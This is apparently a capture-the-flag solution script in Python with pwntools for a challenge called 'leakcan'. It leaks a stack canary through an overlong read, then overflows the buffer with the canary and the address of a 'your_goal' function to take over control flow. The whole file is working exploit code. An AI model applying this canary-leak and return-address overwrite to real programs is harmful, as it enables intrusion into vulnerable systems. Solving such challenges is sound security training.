from pwn import *
from ctftools.pwn.common import connect

exe = ELF("leakcan_chall")
io = connect(exe, "leakcan-25b8ac0dd7fd.tcp.1753ctf.com", 8435)

# *********************************************************
# offset 探し
# *********************************************************

# def is_stack_smashed(length):
#     io = connect(exe, "host", 1337)
#     io.send(b'A' * length)
#     io.recvuntil(b'Hello!')
#     io.send(b'X')

#     res = io.recvall()
#     io.close()
#     return b'stack smash' in res

# ok = 0
# ng = 0x78
# while ng - ok > 1:
#     x = (ok + ng) // 2
#     if is_stack_smashed(x):
#         ng = x
#     else:
#         ok = x
# assert ok == 88

offset = 88
io.send(b'x' * (offset + 1))
io.recvuntil(b'Hello! ')
xxxx_canary = io.recv(offset + 8)
canary = int.from_bytes(b'\x00' + xxxx_canary[-7:], 'little')

your_goal = exe.symbols.your_goal
io.send(b'x' * offset + pack(canary) + pack(your_goal) * 2)

io.interactive()